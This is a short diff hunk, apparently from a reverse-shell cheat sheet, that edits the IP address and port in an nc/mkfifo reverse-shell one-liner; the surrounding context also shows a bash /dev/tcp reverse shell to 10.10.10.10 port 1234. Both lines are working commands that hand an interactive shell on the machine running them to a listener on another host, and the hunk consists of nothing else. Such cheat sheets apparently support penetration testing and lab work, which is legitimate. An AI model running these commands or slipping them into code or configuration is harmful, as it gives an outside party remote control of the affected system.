@@ -152,7 +152,7 @@ bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
 ```
 
 ```shell
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.156 1234 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 7777 >/tmp/f
 ```
 
 ```powershell
